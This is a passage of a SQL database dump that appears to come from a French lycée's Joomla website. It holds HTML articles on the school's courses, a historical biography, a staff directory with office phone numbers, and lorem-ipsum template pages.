(6, 39, 'UN LYCÉE', 'un-lycee', '', '<div class="tblock1">UN</div>\r\n<div class="tblock2">Lycée</div>\r\n<p><img class="logoEN" src="images/EN.png" border="0" width="100" height="81" /> <img src="images/dessinLycee.jpg" border="0" width="99" height="73" style="border: 0;" /></p>\r\n<p>Situé sur le campus de l’École Normale Supérieure de Cachan, l''établissement propose une gamme très complète de formations dans les voies générales et technologiques. Le lycée développe de nombreux partenariats avec le milieu universitaire et économique, participe activement à la formation continue et intervient dans une licence professionnelle.</p>\r\n<p class="readmore"><a href="index.php/lycee"> Lire Plus </a></p>', '', -2, 0, 0, 8, '2011-07-18 05:44:26', 42, '', '2016-04-01 10:23:34', 390, 0, '0000-00-00 00:00:00', '2011-07-18 05:44:26', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"Read More","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 48, 0, 2, '', '', 1, 74, '{"robots":"","author":"","rights":"","xreference":""}', 1, '*', ''),
(21, 57, 'Pré-Bac', 'pre-bac', '', '<h2>Pré-Bac </h2>\r\n<h3>Les Secondes</h3>\r\n<p>Important : <br />Les langues vivantes 1 et 2 que vous choisirez par la suite doivent nécessairement prolonger un enseignement reçu lors de l’année scolaire précédente.<br /><br />Langue vivante 1 : allemand ou anglais<br />Langue vivante 2 : allemand ou anglais ou espagnol<br /><br />Enseignements d''exploration en Seconde :<br /><br /> - Un premier enseignement parmi les deux enseignements d''économie. (P.F.E.G. ou S.E.S.)<br /> - Un deuxième enseignement choisi parmi six. (LV3 ou M.P.S. ou Biotechnologie ou Litterature et société ou Santé Sociale ou Sciences et Laboratoire)</p>\r\n<p> </p>\r\n<h3>Les Premières</h3>\r\n<p>ES (Sciences Économiques et Sociales)<br />Mathématiques ou S.E.S. ou anglais renforcé<br /><br />L (Littéraire)<br />LV3 (allemand ou italien ou portugais) ou anglais renforcé<br /><br />S (Scientifique)<br />S.T.2.S. (Sciences et Technologies de la Santé et du Social)<br /><br />S.T.L-BGB. (Sciences et Technologies de Laboratoire)<br />Biochimie - Génie Biologique<br /><br />S.T.G. (Sciences et Technologies de la Gestion)<br />Biotechtnologies.</p>\r\n<p> </p>\r\n<h3>Les Terminales</h3>\r\n<p>STMG (sciences et technologies du management et de la gestion)<br />1 spécialité au choix parmi :  </p>\r\n<ul>\r\n<li>Gestion et finance</li>\r\n<li>Systèmes d''information de gestion</li>\r\n<li>Ressources humaines et communication</li>\r\n<li>Marketing (mercatique)</li>\r\n</ul>\r\n<p> </p>\r\n<p> </p>\r\n<p> </p>', '', -2, 0, 0, 7, '2012-10-29 16:06:09', 390, '', '2013-11-11 13:50:35', 390, 0, '0000-00-00 00:00:00', '2012-10-29 16:06:09', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 7, 0, 12, '', '', 1, 313, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(7, 40, 'des formations', 'des-formations', '', '<div class="tblock1">DES</div>\r\n<div class="tblock2">FORMATIONS</div>\r\n<dl class="art-dl"><dt><a href="21-baccalaureats">Pré-BAC</a></dt><dd>Le lycée offre un grand choix de filières tant en générale (L, ES, S) que technologique (STMG, STL, ST2S).</dd></dl><dl class="art-dl"><dt><a href="22-etudes-post-bac">Post-BAC</a></dt><dd>Choisissez un de nos nombreux Brevet de Technicien Supérieur (BTS), intégrez notre CPGE économique commerciale et juridique ou une de nos formations <span style="text-decoration: underline;"><a href="23-etudes-post-bts">bac +3</a></span>.</dd></dl>\r\n<p class="readmore"><a href="index.php/formations"> Lire Plus </a></p>', '', -2, 0, 0, 8, '2011-07-18 05:45:49', 42, '', '2014-01-05 23:32:12', 390, 0, '0000-00-00 00:00:00', '2011-07-18 05:45:49', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"Read More","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 51, 0, 1, '', '', 1, 33, '{"robots":"","author":"","rights":"","xreference":""}', 1, '*', ''),
(8, 41, 'actualités', 'actualites', '', '<div class="tblock1">DES</div>\r\n<div class="tblock2">actualites</div>\r\n<p>Suivez les nombreuses actualités de notre lycée.</p>\r\n<ul class="art-list">\r\n<li>Dates des conseils et réunions</li>\r\n<li>Orientation et APB</li>\r\n<li>Les CPGE vous présente leur filière</li>\r\n<li>Bacs blancs, à vos cahiers !</li>\r\n<li><a href="loremipsum">Test</a></li>\r\n</ul>\r\n<p class="readmore" style="padding-top: 19px;"><a href="index.php/actualites">Lire Plus </a></p>', '', -2, 0, 0, 8, '2011-07-18 05:46:59', 42, '', '2016-06-08 14:12:57', 390, 0, '0000-00-00 00:00:00', '2011-07-18 05:46:59', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"Read More","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 42, 0, 0, '', '', 1, 40, '{"robots":"","author":"","rights":"","xreference":""}', 1, '*', ''),
(19, 55, 'historique', 'historique', '', '<p align="center"><img src="http://www.lms.ens-cachan.fr/max_sorre.jpg" border="0" width="168" height="193" /></p>\r\n<p> </p>\r\n<p align="center"><span style="color: #000099;"><strong><span style="color: #009900;">Maximilien</span> <span style="color: #ff6600;">Sorre</span> <span style="color: #cc0000;">1880 - 1962</span></strong></span></p>\r\n<p> </p>\r\n<p style="color: #000000;">Ancien élève de l''École Normale Supérieure de Saint-Cloud, il devient Docteur ès Lettres en 1913 avec une thèse de Géographie biologique sur les Pyrénées méditerranéennes.</p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;">Professeur de Faculté, recteur de l''académie de Clermont-Ferrand puis de celle d''Aix Marseille, Directeur de l''Enseignement du Premier degré de 1937 à 1940, il enseigne ensuite à l''université de Montpellier puis à la Sorbonne (1941-1948).</p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;">Auteur d''un ouvrage de synthèse sur les Pyrénées (1928), puis sur les migrations des peuples (1955), il a collaboré à la Géographie universelle, en particulier sur le Mexique, l''Amérique Centrale (1934), la Méditerranée et les Péninsules méditerranéennes. Son traité <span style="font-style: italic;">Les fondements de la Géographie humaine</span> fait autorité.</p>', '', 2, 0, 0, 13, '2012-10-29 15:46:47', 390, '', '2012-10-29 17:39:10', 390, 0, '0000-00-00 00:00:00', '2012-10-29 15:46:47', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 3, 0, 13, '', '', 1, 0, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(9, 43, 'The best of professionals', 'the-best-of-professionals', '', '<p class="intro">Laoreet dolore magna.orem ipsum dolor ser adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet.</p>\r\n\r\n<p>Laoreet dolore magnaorem ipsum dolor ser adipiscing elit, sed diam nonummy nibh euismod tincidunt laoreet dolore setsit amet consectetuer adipiscing elit sed diam nonummy nonummy nibh euismod tincidunt ut laoreet dolore magna.orem ipsum dolor ser adipiscing elit sed diam nonummy nibh set dolor. Lorem ipsum dolor sit amet, consectetuer.</p>\r\n\r\n<p>Tincidunt laoreet dolore setsit amet consectetuer adipiscing elit sed diam nonummy nonummy nibh euismod tincidunt ut laoreet dolore magna.orem ipsum dolor ser adipiscing elit sed diam nonummy nibh set dolor. Lorem ipsum dolor sit amet consectetuer unde omnis iste natuseme error sit voluptatem accusantium doloremque laudantium, totam rem.</p>\r\n\r\n', '\r\n\r\n<p class="intro">Laoreet dolore magna.orem ipsum dolor ser adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet.</p>\r\n\r\n<p>Laoreet dolore magnaorem ipsum dolor ser adipiscing elit, sed diam nonummy nibh euismod tincidunt laoreet dolore setsit amet consectetuer adipiscing elit sed diam nonummy nonummy nibh euismod tincidunt ut laoreet dolore magna.orem ipsum dolor ser adipiscing elit sed diam nonummy nibh set dolor. Lorem ipsum dolor sit amet, consectetuer.</p>\r\n\r\n<p>Tincidunt laoreet dolore setsit amet consectetuer adipiscing elit sed diam nonummy nonummy nibh euismod tincidunt ut laoreet dolore magna.orem ipsum dolor ser adipiscing elit sed diam nonummy nibh set dolor. Lorem ipsum dolor sit amet consectetuer unde omnis iste natuseme error sit voluptatem accusantium doloremque laudantium, totam rem.</p>\r\n\r\n<p> Maecenas enim enim, euismod vitae consectetur vel, vestibulum at lectus.   Sed a metus eu eros faucibus tristique. Phasellus libero tortor,   blandit nec ultrices et, volutpat eu est. Cum sociis natoque penatibus   et magnis dis parturient montes, nascetur ridiculus mus. Aenean   ullamcorper, eros at euismod feugiat, felis nisi adipiscing arcu, vitae   condimentum neque tortor eget ipsum. Fusce ac lectus eu dui iaculis   viverra vitae sed dolor. Quisque rhoncus, ante ac sagittis ornare, orci   nisl varius velit, a hendrerit tortor massa vitae felis. Mauris   vestibulum tellus ac diam sagittis nec faucibus dui congue. Nulla vel   adipiscing odio. In eu auctor est. Curabitur nulla augue, sollicitudin   non eleifend adipiscing, consequat in urna. In elementum volutpat lorem,   ultricies varius lacus vulputate ac. Curabitur tristique facilisis   rhoncus. Cras in magna purus. Integer eget purus tortor, scelerisque   vehicula nulla. Aliquam id odio mollis neque sagittis molestie. Donec   quis leo vel augue semper fermentum ut at nisi. </p>\r\n', 2, 0, 0, 9, '2011-08-02 15:14:10', 42, '', '2011-08-04 15:51:38', 42, 0, '0000-00-00 00:00:00', '2011-08-02 15:14:10', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":""}', 2, 0, 1, '', '', 1, 8, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(10, 44, 'Free Consultation', 'free-consultation', '', '<p class="art-img"><img src="images/page2-img1.jpg" alt="1" /></p>\r\n\r\n<p class="intro">Laoreet dolore magna.orem ipsum dolore ser adipiscing elit sediam nonummy.</p>\r\n\r\n<p>Laoreet dolore magnaorem ipsum dolor ser adipiscing elit, sed diam nonummy nibhe euismod tincidunt laoreet dolore setsit amet consectet.</p>\r\n\r\n<p class="clear">&nbsp;</p>\r\n\r\n', '\r\n\r\n<p> Nunc cursus libero aliquam velit euismod quis dictum eros convallis.   Cras mollis tortor quis nulla commodo sodales. Suspendisse condimentum   ultricies ligula sed interdum. Sed venenatis libero venenatis velit   scelerisque tempus. Sed varius risus eget nunc ornare pellentesque.   Vestibulum accumsan dictum orci ac blandit. Etiam elit sapien,   scelerisque ut laoreet ut, laoreet id tortor. Cras felis ante, imperdiet   consectetur scelerisque id, vulputate eget risus. Quisque metus quam,   varius in pretium malesuada, fringilla at diam. Integer elementum mauris   ac mi ornare tristique. Sed rhoncus, elit vulputate viverra   pellentesque, tortor sem viverra diam, quis fringilla odio sem et massa.   Vivamus dolor sem, facilisis at iaculis at, fermentum quis erat. Aenean   luctus nisl et mauris mollis commodo. In sapien diam, tristique quis   convallis id, lacinia vitae nulla. Curabitur tincidunt consectetur felis   nec bibendum. Vivamus sed lorem justo, sed pellentesque nisl. Vivamus   ullamcorper urna quis leo facilisis euismod suscipit dui laoreet. Duis   dictum molestie tempus. Sed tortor massa, malesuada mattis ultrices sed,   molestie sit amet eros. Class aptent taciti sociosqu ad litora torquent   per conubia nostra, per inceptos himenaeos. </p>\r\n\r\n<p> Maecenas enim enim, euismod vitae consectetur vel, vestibulum at lectus.   Sed a metus eu eros faucibus tristique. Phasellus libero tortor,   blandit nec ultrices et, volutpat eu est. Cum sociis natoque penatibus   et magnis dis parturient montes, nascetur ridiculus mus. Aenean   ullamcorper, eros at euismod feugiat, felis nisi adipiscing arcu, vitae   condimentum neque tortor eget ipsum. Fusce ac lectus eu dui iaculis   viverra vitae sed dolor. Quisque rhoncus, ante ac sagittis ornare, orci   nisl varius velit, a hendrerit tortor massa vitae felis. Mauris   vestibulum tellus ac diam sagittis nec faucibus dui congue. Nulla vel   adipiscing odio. In eu auctor est. Curabitur nulla augue, sollicitudin   non eleifend adipiscing, consequat in urna. In elementum volutpat lorem,   ultricies varius lacus vulputate ac. Curabitur tristique facilisis   rhoncus. Cras in magna purus. Integer eget purus tortor, scelerisque   vehicula nulla. Aliquam id odio mollis neque sagittis molestie. Donec   quis leo vel augue semper fermentum ut at nisi. </p>\r\n', 2, 0, 0, 9, '2011-08-02 15:15:28', 42, '', '2011-08-04 15:51:06', 42, 0, '0000-00-00 00:00:00', '2011-08-02 15:15:28', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":""}', 4, 0, 2, '', '', 1, 11, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(11, 46, 'le Lycée', 'educational-facilities', '', '<h1 class="text">Équipe de direction</h1>\r\n<p>Notre lycée est marqué par la grande implication des professeurs et de l''ensemble des personnels qui sont très attachés à la réussite des élèves. Les résultats sont supérieurs eu égaux aux moyennes académiques et nationales. La vie dans l''établissement est sereine, grâce à une réelle exigence concernant l''assiduité, le respect mutuel et le travail mais aussi grâce à l''attention bienveillante portée aux situations individuelles de nos élèves et étudiants.</p>\r\n<p class="readmore"><a href="lycee/54-equipe-direction">Lire Plus </a></p>\r\n<h1 class="readmore">Vie scolaire</h1>\r\n<div class="text">Découvrez la vie scolaire de notre lycée. Sports et associations sont nombreuses pour vous divertir et vous aider.<br />\r\n<p class="readmore"><a href="vie-scolaire"> Lire Plus </a></p>\r\n<h1 class="text">Le CDI</h1>\r\n<div class="text">Installé au 3ème étage en salle 301 et 303, le CDI est commun aux professeurs et aux élèves. C’est un espace de travail où les élèves du lycée peuvent se rendre seuls ou accompagnés d’un professeur.<br />C’est un lieu de ressources multimédia où chacun pourra se documenter, s’informer ou lire.</div>\r\n<div class="text"> </div>\r\n<p class="readmore"><a href="cdi"> Lire Plus </a></p>\r\n</div>', '', -2, 0, 0, 10, '2011-08-02 15:39:53', 42, '', '2016-06-09 15:24:50', 390, 0, '0000-00-00 00:00:00', '2011-08-02 15:39:53', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 32, 0, 1, '', '', 1, 99, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(39, 78, 'Administration', 'administration', '', '<p style="text-align: center; color: #009900;"><em><strong>Direction</strong></em></p>\r\n<p><br /> <strong><span style="color: #000000;">Proviseur </span></strong></p>\r\n<p> <span style="color: #000099;">Guy </span><span style="color: #0000cc;">THOMAS</span></p>\r\n<p align="left"><span style="color: black;"><br /> </span><strong><span style="color: white;">____</span><span style="font-weight: normal; text-decoration: underline; color: black;">Secrétariat- Bureau <span style="font-weight: bold;">4</span></span></strong></p>\r\n<p align="left"><span style="background-color: white;"><span style="color: white;">-----_</span></span><span style="color: black;">Sonia PERPETUO</span></p>\r\n<p align="left"><span style="background-color: white;"><span style="color: white;">____-</span></span><span style="color: #000000; font-style: italic;">01 47 40 49 61</span></p>\r\n<p style="color: #000000;" align="left"><span style="background-color: white;">         </span><span style="font-style: italic;">01 46 64 92 72</span> (Fax)</p>\r\n<p style="color: #000000;" align="left">        P. PRIER <span style="font-style: italic;">01 47 40  49 31</span></p>\r\n<p align="left"><span style="color: white;">      -<span style="color: #333333;">-Gestion de carrière des personnels enseignants d''éducation et de surveillance.</span></span></p>\r\n<p style="color: #333333;" align="left">        -Courrier - Accueil du public</p>\r\n<p align="left"><span style="color: white;"><span style="color: #000000;"><span style="color: #333333;">        -Dossiers, DECESF</span></span></span></p>\r\n<p><span style="color: black;"><br /> <br /> </span><strong><span style="color: black;">Proviseurs-adjoints</span></strong><span style="color: #0000cc;"><br /> Elisabeth MORISSON, Dominique NICOLAS, Catherine PRIE-LERAY<br /> </span></p>\r\n<p><span style="color: black;">  </span></p>\r\n<p><strong><span style="color: white;">___</span></strong><strong><span style="text-decoration: underline; font-weight: normal; color: black;">Secrétariat - Bureau <span style="font-weight: bold;">8</span></span></strong></p>\r\n<p><span style="color: white;">____-</span><span style="color: black;">Aïcha AHMED-OUCHETATI </span></p>\r\n<p><span style="color: white;">____--</span><span style="font-style: italic; color: black;">01 47 40 49 62</span></p>\r\n<p><strong><span style="color: white;">_</span></strong></p>\r\n<p><strong><span style="font-weight: normal; color: black;">      </span><span style="font-weight: normal; text-decoration: underline; color: black;">Secrétariat- Bureau <span style="font-weight: bold;">6</span></span></strong></p>\r\n<p align="left"><span style="color: white;">____-</span><span style="color: black;">Lydia GOURVES</span></p>\r\n<p><span style="color: white;">____--</span><span style="font-style: italic; color: black;">01 47 40 49 63</span></p>\r\n<p><span style="color: black;"> </span></p>\r\n<p><span style="color: white;">____-<span style="color: #000000;">C. SANTORO 1ERE DST <span style="font-style: italic;">01 47 40 49 64</span></span></span></p>\r\n<p><span style="color: white;"><span style="color: #000000;"><span style="font-style: italic;">        </span></span></span></p>\r\n<p><span style="color: white;"><span style="color: #000000;"><span style="font-style: italic;">         </span><span style="color: #333333;">-Organisation des enseignements</span></span></span></p>\r\n<p><span style="color: white;"><span style="color: #000000;"><span style="color: #333333;">         -Gestion des salles</span></span></span></p>\r\n<p><span style="color: white;"><span style="color: #000000;"><span style="color: #333333;">          -Elèves : inscriptions et réinscriptions</span></span></span></p>\r\n<p><span style="color: white;"><span style="color: #000000;"><span style="color: #333333;">          -Dossiers BAC; Bourses</span></span></span></p>\r\n<p><span style="color: white;"><span style="color: #000000;"><span style="color: #333333;">          -CPGE - AM - ABM - CI - SIO - CGO</span></span></span></p>\r\n<p><span style="color: white;">___</span><span style="color: black;"><br /> </span></p>\r\n<hr style="width: 100%; height: 2px;" />\r\n<p><span style="color: black;"><br /> </span></p>\r\n<div style="text-align: center;"><span style="color: black;"><strong><span style="font-style: italic;">Accueil</span> </strong></span><br /> </div>\r\n<p style="color: #3333ff;">M. ALEXANDRE<span style="color: black;"><span style="color: #3333ff;">, </span></span>Mme NORMAND</p>\r\n<p><span style="color: white;">-</span><span style="font-style: italic; color: black;">01 47 40 49 60</span></p>\r\n<p><span style="color: black;"><br /> </span></p>\r\n<hr style="width: 100%; height: 2px;" />\r\n<p><span style="color: black;"><br /> </span></p>\r\n<div style="text-align: center; color: #cc0000;"><strong><em>Intendance</em></strong></div>\r\n<p><strong><span style="color: black;">Gestionnaire</span></strong><span style="color: #0000ff;"><br /> Samia BEN YOUSSEF</span></p>\r\n<p><span style="color: white;">---</span><span style="color: black;"><span style="font-style: italic;">01 47 40 49 73</span> </span></p>\r\n<p><strong><span style="color: white;">_</span></strong></p>\r\n<p><strong><span style="color: white;">____</span><span style="font-weight: normal; text-decoration: underline; color: black;">Secrétariat - Bureau <span style="font-weight: bold;">2</span></span></strong></p>\r\n<p><span style="color: white;">_-__-</span><span style="color: black;">Céline BOURHIS </span></p>\r\n<p><span style="color: white;">_-__-_</span><span style="font-style: italic; color: black;">01 47 40 49 65</span></p>\r\n<p><span style="color: white;">____--</span><span style="color: black;">-Gestion financière</span></p>\r\n<p><span style="color: black;">          -Logistique et travaux</span></p>\r\n<p><span style="color: black;">          -Taxe d''apprentissage, Bourses</span></p>\r\n<p><span style="color: black;"> </span></p>\r\n<hr style="width: 100%; height: 2px;" />\r\n<div style="text-align: center;"><span style="color: black;"><span style="font-weight: bold; font-style: italic; color: #009900;">Chefs de travaux</span>         </span></div>\r\n<p><span style="color: black;"><strong><br /> <a name="michel"></a> Chef de travaux - Economie-Gestion-Informatique</strong><br /> </span></p>\r\n<p style="color: #3333ff;">Roland MICHEL</p>\r\n<p><span style="color: black;"><br /> <span style="text-decoration: underline;">2éme étage Salle <span style="font-weight: bold;">204b</span></span></span></p>\r\n<p><span style="background-color: white;"><span style="color: white;">--</span></span><span style="font-style: italic; color: black;">01 47 40 49 75</span></p>\r\n<p style="text-align: left;"><span style="color: white;">-<span style="color: #333333;">-</span></span><span style="color: black;">Responsable des départements d''économie-gestion   et d''informatique.</span></p>\r\n<p><span style="color: white;"> -</span><span style="color: black;"><span style="color: #333333;">Administrateur du réseau informatique.</span><br /> <br /> </span></p>\r\n<p><strong><strong><span style="color: white;">____</span><span style="font-weight: normal; text-decoration: underline; color: black;">Assistant</span></strong></strong></p>\r\n<p><span style="color: white;">__-__</span><span style="color: black;">Clément DAVID</span></p>\r\n<p><span style="color: black;">        salle <span style="font-weight: bold;">204</span> </span></p>\r\n<p><span style="color: white;">_-_-_ </span><span style="font-style: italic; color: black;">01 47 40 49 67</span></p>\r\n<p><span style="color: white;">_-_-_  </span><span style="color: black;">Technicien Informatique.</span></p>\r\n<p style="color: #333333;">          Gestion des conventions de stage.</p>\r\n<p><br /> <strong><span style="color: black;">Chef de travaux - Secteur laboratoires</span></strong></p>\r\n<p><span style="color: black;"><span style="color: #3333ff;">Danièle HEBRARD</span></span></p>\r\n<p><span style="color: black;"><br /> <span style="text-decoration: underline;">1er étage - salle <span style="font-weight: bold;">110</span></span></span></p>\r\n<p><span style="color: white;">--</span><span style="font-style: italic; color: black;">01 47 40 49 74</span></p>\r\n<p><span style="color: white;">--</span><span style="color: black;">Responsable des enseignements scientifiques et des laboratoires.</span></p>\r\n<hr style="width: 100%; height: 2px;" />\r\n<p style="font-weight: bold; text-align: center; font-style: italic; color: #ff6600;"><span style="color: #333333;"><span style="color: #ff6600;">Entretien/Patrimoine</span></span></p>\r\n<p style="color: #3333ff;"><span style="color: #333333;"><span style="color: #3333ff;">M. SMANIOTTO</span></span></p>\r\n<p><span style="color: black;"><span style="font-style: italic; color: #000000;">01 47 40 49 83</span></span></p>\r\n<p><span style="color: black;"> </span></p>\r\n<p style="color: #333333;">Annexe Carnot</p>\r\n<p><span style="color: #333333;"><span style="color: #3333ff;">M. COURTOIS</span></span></p>\r\n<p><span style="color: black;"><span style="font-style: italic; color: #000000;">01 49 08 52 00</span></span></p>\r\n<p> </p>\r\n<p><span style="color: black; font-size: xx-small;"><br /> </span></p>', '', -2, 0, 0, 2, '2012-10-29 18:32:39', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2012-10-29 18:32:39', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 1, '', '', 1, 159, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(12, 47, 'Training Facility', 'training-facility', '', '<p>Laoreet dolore magnaorem ipsum dolor ser adipiscing elit, sed diam nonummy nibh euismod tincidunt laoreet dolore setsit amet consectetuer adipiscing elit sed diam nonummy nonummy nibh euismod tincidunt ut laoreet dolore magna.orem ipsum dolor ser adipiscing elit sed diam nonummy nibh set dolor. Lorem ipsum dolor sit amet, consectetuer.</p>\r\n\r\n', '\r\n\r\n<p>Laoreet dolore magnaorem ipsum dolor ser adipiscing elit, sed diam nonummy nibh euismod tincidunt laoreet dolore setsit amet consectetuer adipiscing elit sed diam nonummy nonummy nibh euismod tincidunt ut laoreet dolore magna.orem ipsum dolor ser adipiscing elit sed diam nonummy nibh set dolor. Lorem ipsum dolor sit amet, consectetuer.</p>\r\n\r\n\r\n<p> Nunc cursus libero aliquam velit euismod quis dictum eros convallis.   Cras mollis tortor quis nulla commodo sodales. Suspendisse condimentum   ultricies ligula sed interdum. Sed venenatis libero venenatis velit   scelerisque tempus. Sed varius risus eget nunc ornare pellentesque.   Vestibulum accumsan dictum orci ac blandit. Etiam elit sapien,   scelerisque ut laoreet ut, laoreet id tortor. Cras felis ante, imperdiet   consectetur scelerisque id, vulputate eget risus. Quisque metus quam,   varius in pretium malesuada, fringilla at diam. Integer elementum mauris   ac mi ornare tristique. Sed rhoncus, elit vulputate viverra   pellentesque, tortor sem viverra diam, quis fringilla odio sem et massa.   Vivamus dolor sem, facilisis at iaculis at, fermentum quis erat. Aenean   luctus nisl et mauris mollis commodo. In sapien diam, tristique quis   convallis id, lacinia vitae nulla. Curabitur tincidunt consectetur felis   nec bibendum. Vivamus sed lorem justo, sed pellentesque nisl. Vivamus   ullamcorper urna quis leo facilisis euismod suscipit dui laoreet. Duis   dictum molestie tempus. Sed tortor massa, malesuada mattis ultrices sed,   molestie sit amet eros. Class aptent taciti sociosqu ad litora torquent   per conubia nostra, per inceptos himenaeos. </p>\r\n\r\n<p> Maecenas enim enim, euismod vitae consectetur vel, vestibulum at lectus.   Sed a metus eu eros faucibus tristique. Phasellus libero tortor,   blandit nec ultrices et, volutpat eu est. Cum sociis natoque penatibus   et magnis dis parturient montes, nascetur ridiculus mus. Aenean   ullamcorper, eros at euismod feugiat, felis nisi adipiscing arcu, vitae   condimentum neque tortor eget ipsum. Fusce ac lectus eu dui iaculis   viverra vitae sed dolor. Quisque rhoncus, ante ac sagittis ornare, orci   nisl varius velit, a hendrerit tortor massa vitae felis. Mauris   vestibulum tellus ac diam sagittis nec faucibus dui congue. Nulla vel   adipiscing odio. In eu auctor est. Curabitur nulla augue, sollicitudin   non eleifend adipiscing, consequat in urna. In elementum volutpat lorem,   ultricies varius lacus vulputate ac. Curabitur tristique facilisis   rhoncus. Cras in magna purus. Integer eget purus tortor, scelerisque   vehicula nulla. Aliquam id odio mollis neque sagittis molestie. Donec   quis leo vel augue semper fermentum ut at nisi. </p>\r\n', 2, 0, 0, 10, '2011-08-02 15:41:31', 42, '', '2011-08-04 15:52:19', 42, 0, '0000-00-00 00:00:00', '2011-08-02 15:41:31', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":""}', 3, 0, 2, '', '', 1, 9, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(13, 48, 'Privacy Policy', 'privacy-policy', '', '<p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Praesent vestibulum molestie lacus. Aenean nonummy hendrerit mauris. Phasellus porta fusce suscipit varius mi. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Nulla dui usce feugiat malesuada odio. Morbi nunc odio, gravida at, cursus nec, luctus a, lorem. Maecenas tristique orci ac sem. Duis ultricies pharetra magna. Donec accumsan malesuada orci. Donec sit amet eros. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Mauris fermentum dictum magna. Sedume laoreet aliquam leo. Ut tellus dolor, dapibus eget, elementum vel, cursus eleifend, elit. Aenean auctor wisi et urna. Aliquam erat volutpat. Duis ac turpis. Integer rutrum ante eu lacus. Quisque nulla. Vestibulum libero nisl, porta vel, scelerisque eget, malesuada at, neque. Vivamus eget nibh. Etiam cursus leo vel metus. Nulla facilisi. Aenean nec eros. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Suspendisse sollicitudin velit sed 